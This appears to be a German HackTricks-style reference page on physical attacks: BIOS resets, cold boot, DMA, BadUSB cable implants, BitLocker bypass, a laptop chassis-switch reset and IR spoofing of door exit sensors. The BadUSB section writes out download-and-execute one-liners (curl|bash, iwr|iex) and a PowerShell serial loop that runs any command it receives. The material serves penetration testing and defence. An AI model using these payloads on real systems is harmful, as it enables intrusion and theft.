# Physische Angriffe

{{#include ../banners/hacktricks-training.md}}

## BIOS-Passwortwiederherstellung und Systemsicherheit

**Resetting the BIOS** kann auf mehrere Weisen erfolgen. Die meisten Mainboards enthalten eine **Batterie**, die, wenn sie für etwa **30 Minuten** entfernt wird, die BIOS-Einstellungen einschließlich des Passworts zurücksetzt. Alternativ kann ein **Jumper auf dem Mainboard** angepasst werden, um diese Einstellungen zurückzusetzen, indem bestimmte Pins verbunden werden.

Wenn Hardware-Anpassungen nicht möglich oder praktikabel sind, bieten **Software-Tools** eine Lösung. Ein System von einer **Live CD/USB** mit Distributionen wie **Kali Linux** zu starten, verschafft Zugriff auf Tools wie **_killCmos_** und **_CmosPWD_**, die bei der BIOS-Passwortwiederherstellung helfen können.

Wenn das BIOS-Passwort unbekannt ist, führt das dreimalige falsche Eingeben in der Regel zu einem Fehlercode. Dieser Code kann auf Websites wie [https://bios-pw.org](https://bios-pw.org) verwendet werden, um möglicherweise ein brauchbares Passwort zu erhalten.

### UEFI-Sicherheit

Für moderne Systeme, die **UEFI** statt des traditionellen BIOS verwenden, kann das Tool **chipsec** verwendet werden, um UEFI-Einstellungen zu analysieren und zu ändern, einschließlich dem Deaktivieren von **Secure Boot**. Dies kann mit dem folgenden Befehl erreicht werden:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## RAM Analysis and Cold Boot Attacks

RAM behält Daten kurz nach dem Abschalten der Stromversorgung, normalerweise für **1 bis 2 Minuten**. Diese Persistenz kann durch Aufbringen von Kältemitteln wie flüssigem Stickstoff auf **10 Minuten** verlängert werden. Während dieses verlängerten Zeitraums kann ein **memory dump** mit Tools wie **dd.exe** und **volatility** erstellt werden, um die Analyse durchzuführen.

---

## Direct Memory Access (DMA) Attacks

**INCEPTION** ist ein Tool, das für **physische Speicher-Manipulation** über DMA entwickelt wurde und mit Schnittstellen wie **FireWire** und **Thunderbolt** kompatibel ist. Es erlaubt das Umgehen von Login-Prozeduren, indem der Speicher so gepatcht wird, dass jedes Passwort akzeptiert wird. Gegen **Windows 10**-Systeme ist es jedoch unwirksam.

---

## Live CD/USB for System Access

Das Ersetzen von System-Binaries wie **_sethc.exe_** oder **_Utilman.exe_** durch eine Kopie von **_cmd.exe_** kann eine Eingabeaufforderung mit Systemrechten bereitstellen. Tools wie **chntpw** können verwendet werden, um die **SAM**-Datei einer Windows-Installation zu bearbeiten und Passwörter zu ändern.

**Kon-Boot** ist ein Tool, das das Einloggen in Windows-Systeme ohne Kenntnis des Passworts ermöglicht, indem es temporär den Windows-Kernel oder UEFI modifiziert. Mehr Informationen unter [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).

---

## Handling Windows Security Features

### Boot and Recovery Shortcuts

- **Supr**: Zugriff auf BIOS-Einstellungen.
- **F8**: Ruft den Recovery-Modus auf.
- Das Drücken der **Shift**-Taste nach dem Windows-Banner kann Autologon umgehen.

### BAD USB Devices

Geräte wie **Rubber Ducky** und **Teensyduino** dienen als Plattformen zur Erstellung von **bad USB**-Geräten, die beim Anschluss an einen Zielrechner vordefinierte Payloads ausführen können.

### Volume Shadow Copy

Mit Administratorrechten ist es möglich, über PowerShell Kopien sensibler Dateien, einschließlich der **SAM**-Datei, zu erstellen.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- Auf ESP32-S3 basierende Implantate wie **Evil Crow Cable Wind** verstecken sich in USB-A→USB-C- oder USB-C↔USB-C-Kabeln, melden sich ausschließlich als USB-Tastatur an und exponieren ihren C2-Stack über Wi‑Fi. Der Operator muss das Kabel nur vom Opfer-Host mit Strom versorgen, einen Hotspot namens `Evil Crow Cable Wind` mit dem Passwort `123456789` erstellen und [http://cable-wind.local/](http://cable-wind.local/) (oder dessen DHCP-Adresse) im Browser aufrufen, um die eingebettete HTTP-Schnittstelle zu erreichen.
- Die Browser-UI bietet Tabs für *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* und *Config*. Gespeicherte Payloads sind pro OS getaggt, Tastaturlayouts werden on-the-fly gewechselt und VID/PID-Strings können verändert werden, um bekannte Peripherie zu imitieren.
- Da sich der C2 im Kabel befindet, kann ein Telefon Payloads bereitstellen, die Ausführung auslösen und Wi‑Fi-Zugangsdaten verwalten, ohne das Host-OS zu berühren — ideal für physische Eindringlinge mit kurzer Dwell‑Time.

### OS-aware AutoExec payloads

- AutoExec-Regeln binden ein oder mehrere Payloads so, dass sie sofort nach der USB-Enumeration ausgelöst werden. Das Implantat führt ein leichtes OS-Fingerprinting durch und wählt das passende Script aus.
- Beispiel-Workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) oder `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Da die Ausführung unbeaufsichtigt erfolgt, kann allein das Tauschen eines Ladekabels initialen “plug-and-pwn”-Zugang im Kontext des angemeldeten Benutzers ermöglichen.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** A stored payload opens a console and pastes a loop that executes whatever arrives on the new USB serial device. A minimal Windows variant is:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Das Implantat hält den USB CDC-Kanal offen, während sein ESP32-S3 einen TCP-Client (Python script, Android APK oder desktop executable) zum Operator startet. Alle in die TCP-Session eingegebenen Bytes werden in die oben beschriebene serielle Schleife weitergeleitet, was remote command execution selbst auf air-gapped Hosts ermöglicht. Die Ausgabe ist begrenzt, daher führen Operatoren typischerweise blind commands aus (Account-Erstellung, Staging zusätzlicher Tools, etc.).

### HTTP OTA update surface

- Der gleiche Web-Stack bietet üblicherweise unauthentifizierte Firmware-Updates an. Evil Crow Cable Wind hört auf `/update` und flasht beliebige hochgeladene Binärdateien:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Field operators can hot-swap features (e.g., flash USB Army Knife firmware) mid-engagement without opening the cable, letting the implant pivot to new capabilities while still plugged into the target host.

## Bypassing BitLocker Encryption

BitLocker encryption can potentially be bypassed if the **recovery password** is found within a memory dump file (**MEMORY.DMP**). Tools like **Elcomsoft Forensic Disk Decryptor** or **Passware Kit Forensic** can be utilized for this purpose.

---

## Social Engineering for Recovery Key Addition

A new BitLocker recovery key can be added through social engineering tactics, convincing a user to execute a command that adds a new recovery key composed of zeros, thereby simplifying the decryption process.

---

## Exploiting Chassis Intrusion / Maintenance Switches to Factory-Reset the BIOS

Many modern laptops and small-form-factor desktops include a **chassis-intrusion switch** that is monitored by the Embedded Controller (EC) and the BIOS/UEFI firmware.  While the primary purpose of the switch is to raise an alert when a device is opened, vendors sometimes implement an **undocumented recovery shortcut** that is triggered when the switch is toggled in a specific pattern.

### How the Attack Works

1. The switch is wired to a **GPIO interrupt** on the EC.
2. Firmware running on the EC keeps track of the **timing and number of presses**.
3. When a hard-coded pattern is recognised, the EC invokes a *mainboard-reset* routine that **erases the contents of the system NVRAM/CMOS**.
4. On next boot, the BIOS loads default values – **supervisor password, Secure Boot keys, and all custom configuration are cleared**.

> Once Secure Boot is disabled and the firmware password is gone, the attacker can simply boot any external OS image and obtain unrestricted access to the internal drives.

### Real-World Example – Framework 13 Laptop

The recovery shortcut for the Framework 13 (11th/12th/13th-gen) is:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Nach dem zehnten Zyklus setzt der EC ein Flag, das das BIOS anweist, das NVRAM beim nächsten Reboot zu löschen. Der gesamte Vorgang dauert ~40 s und erfordert **nichts außer einem Schraubendreher**.

### Allgemeines Vorgehen zur Ausnutzung

1. Power-on oder suspend-resume des Ziels, sodass der EC läuft.
2. Entferne die Unterseite, um den intrusion/maintenance-Schalter freizulegen.
3. Reproduziere das herstellerspezifische Toggle-Muster (siehe Dokumentation, Foren oder durch Reverse-Engineering der EC-Firmware).
4. Wieder zusammenbauen und neu starten – Firmware-Schutzmechanismen sollten deaktiviert sein.
5. Starte ein Live-USB (z. B. Kali Linux) und führe die üblichen post-exploitation Maßnahmen durch (credential dumping, data exfiltration, implanting malicious EFI binaries, etc.).

### Erkennung & Gegenmaßnahmen

* Protokolliere Chassis-Intrusion-Ereignisse in der OS-Management-Konsole und korreliere sie mit unerwarteten BIOS-Resets.
* Verwende **Manipulationssiegel** an Schrauben/Abdeckungen, um ein Öffnen zu erkennen.
* Bewahre Geräte in **physisch kontrollierten Bereichen** auf; gehe davon aus, dass physischer Zugriff gleich vollständiger Kompromittierung ist.
* Deaktiviere, falls verfügbar, die herstellerspezifische “maintenance switch reset” Funktion oder fordere eine zusätzliche kryptografische Autorisierung für NVRAM-Resets.

---

## Covert IR Injection Against No-Touch Exit Sensors

### Eigenschaften der Sensoren
- Gängige “wave-to-exit” Sensoren koppeln einen near-IR LED-Emitter mit einem TV-remote-ähnlichen Empfangsmodul, das erst nach mehreren Pulsen (~4–10) des korrekten Trägers (≈30 kHz) einen logischen High meldet.
- Eine Kunststoffabdeckung verhindert, dass Emitter und Empfänger direkt aufeinander schauen, sodass der Controller annimmt, jeder validierte Träger käme von einer nahegelegenen Reflexion und ein Relais ansteuert, das den Türöffner betätigt.
- Sobald der Controller glaubt, ein Ziel sei vorhanden, ändert er oft die ausgehende Modulationshülle, aber der Empfänger akzeptiert weiterhin jeden Burst, der mit dem gefilterten Träger übereinstimmt.

### Angriffsablauf
1. **Erfasse das Emissionsprofil** – klemme einen Logikanalysator an die Controller-Pins, um sowohl die Pre-Detection- als auch die Post-Detection-Wellenformen aufzuzeichnen, die die interne IR-LED antreiben.
2. **Spiele nur die “post-detection” Wellenform zurück** – entferne/ignoriere den serienmäßigen Emitter und betreibe eine externe IR-LED mit dem bereits ausgelösten Muster von Anfang an. Da dem Empfänger nur Pulsanzahl/Frequenz wichtig sind, behandelt er den gefälschten Träger als echte Reflexion und setzt die Relais-Leitung.
3. **Takte die Übertragung** – sende den Träger in abgestimmten Bursts (z. B. einige zehn Millisekunden an, ähnlich aus), um die minimale Pulssumme zu liefern, ohne die AGC oder die Störungsbehandlungs-Logik des Empfängers zu sättigen. Dauerbetrieb des Senders desensibilisiert den Sensor schnell und verhindert, dass das Relais auslöst.

### Long-Range Reflective Injection
- Der Austausch der Labor-LED gegen eine Hochleistungs-IR-Diode, einen MOSFET-Treiber und Fokussieroptik ermöglicht zuverlässiges Triggern aus ~6 m Entfernung.
- Der Angreifer benötigt keine Sichtlinie zum Empfangsfenster; das Zielen des Strahls auf Innenwände, Regale oder Türrahmen, die durch Glas sichtbar sind, lässt reflektierte Energie in das ~30° Sichtfeld eintreten und imitiert eine Nahbereichs-Handbewegung.
- Da die Empfänger nur schwache Reflexionen erwarten, kann ein deutlich stärkerer externer Strahl von mehreren Oberflächen abprallen und trotzdem über dem Erkennungsschwellenwert bleiben.

### Weaponised Attack Torch
- Das Einbetten des Treibers in eine handelsübliche Taschenlampe versteckt das Werkzeug in voller Sicht. Ersetze die sichtbare LED durch eine Hochleistungs-IR-LED, die an das Band des Empfängers angepasst ist, füge einen ATtiny412 (oder ähnlichen) hinzu, um die ≈30 kHz Bursts zu erzeugen, und verwende einen MOSFET, um den LED-Strom zu treiben.
- Eine Teleskop-Zoomlinse bündelt den Strahl für Reichweite/Präzision, während ein Vibrationsmotor unter MCU-Steuerung haptische Bestätigung gibt, dass die Modulation aktiv ist, ohne sichtbares Licht abzugeben.
- Das Durchlaufen mehrerer gespeicherter Modulationsmuster (leicht unterschiedliche Trägerfrequenzen und Hüllen) erhöht die Kompatibilität über umgelabelte Sensorfamilien hinweg und erlaubt es dem Operator, reflektierende Flächen abzusuchen, bis das Relais hörbar klickt und die Tür freigegeben wird.

---

## References

- [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)

{{#include ../banners/hacktricks-training.md}}
